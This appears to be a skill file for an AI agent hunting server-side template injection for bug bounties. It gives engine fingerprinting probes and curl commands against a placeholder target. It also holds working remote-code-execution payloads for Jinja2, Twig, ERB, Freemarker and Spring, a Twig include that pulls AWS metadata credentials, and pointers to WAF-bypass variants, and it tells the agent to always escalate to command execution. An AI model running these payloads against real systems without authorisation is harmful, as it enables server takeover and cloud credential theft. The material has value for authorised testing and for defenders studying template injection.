---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
---

# HUNT-SSTI — Server-Side Template Injection
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

## Template Engine Fingerprinting

Once a `{{7*7}}`/`${7*7}` math eval confirms SSTI, pin down the exact engine. Each row below is the minimal probe + expected marker per engine.

| Engine (stack) | Detection payload | Marker |
|---|---|---|
| Jinja2 / Twig (Python/PHP) | `{{7*7}}` | `49` |
| Jinja2 (string repetition) | `{{7*'7'}}` | `7777777` |
| Mako (Python) | `<% print(7*7) %>` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Smarty (PHP) | `{7*7}` | `49` |
| Pug / Jade (Node.js) | `#{7*7}` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Velocity (Java) | `#set($x=7*7)${x}` | `49` |
| Tornado (Python) | `{% import os %}{{ os.popen('id').read() }}` | command output |
| Handlebars (Node.js) | `{{#with "s" as |string|}}{{string.sub "hello" 0 1}}{{/with}}` | `h` |
| Nunjucks (Node.js) | `{{range.constructor("return 7*7")()}}` | `49` |

```bash
# Differentiate once math works
curl -s "https://<target>/?name={{7*'7'}}" | grep "7777777"   # Jinja2 (49 here = Twig)
curl -s "https://<target>/?name=<%= 7*7 %>" | grep "49"       # ERB
curl -s "https://<target>/?name={7*7}" | grep "49"            # Smarty
curl -s 'https://<target>/?name=${7*7}' | grep "49"           # Freemarker / Velocity / Mako
curl -s "https://<target>/?name=<% print(7*7) %>" | grep "49" # Mako
curl -s 'https://<target>/?name={% set x = 7*7 %}{{x}}' | grep "49" # Tornado
```

### Context detection

SSTI can land in HTML, JS-string, or attribute contexts — wrap probes in markers to confirm where it renders:

```bash
curl -s 'https://<target>/?name=BEFORE{{7*7}}AFTER' | grep "BEFORE49AFTER"
curl -s 'https://<target>/?name=">{{7*7}}' | grep ">49"
curl -s "https://<target>/?name={{7*7}}<!--" | grep "49"
```

### Transport surfaces beyond query params

```bash
# Form-encoded POST
curl -s -X POST "https://<target>/contact" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name={{7*7}}&email=test@test.com&message=hello" | grep "49"

# JSON body
curl -s -X POST "https://<target>/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{7*7}}"}' | grep "49"

# XML body
curl -s -X POST "https://<target>/api/process" \
  -H "Content-Type: application/xml" \
  -d '<name>{{7*7}}</name>' | grep "49"

# Filename-based SSTI
echo "test" > '{{7*7}}.txt'
curl -s -X POST "https://<target>/upload" -F "file=@{{7*7}}.txt" | grep "49"

# SVG upload (XML-backed templates re-rendered server-side)
cat > payload.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <text>{{7*7}}</text>
</svg>
EOF
curl -s -X POST "https://<target>/upload" -F "file=@payload.svg" | grep "49"
```

### False positives to ignore

- `49` appearing unrelated to the reflection point (page numbers, counters)
- Math expressions evaluated client-side in JavaScript
- Template syntax inside comments or pre-rendered content
- `{{7*7}}` reflected literally (no evaluation = no SSTI)

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
